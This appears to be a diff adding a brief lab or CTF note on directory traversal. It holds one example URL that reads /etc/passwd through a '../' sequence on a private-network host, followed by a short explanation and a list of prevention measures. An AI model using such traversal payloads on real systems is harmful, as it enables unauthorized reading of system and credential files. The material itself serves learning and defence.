@@ -1,0 +1,20 @@
+http://10.12.100.159/?page=../../../../../../../etc/passwd
+
+
+
+Directory traversal vulnerabilities allow attackers to access arbitrary files
+on your system. They tend to occur in older technology stacks, which map URLs
+too literally to directories on disk.
+
+
+prevention:
+
+-Use a Content Management System
+
+-Use Indirection
+
+-Segregate Your Documents
+
+-Sanitize Filename Parameters
+
+-Run with Restricted Permissions
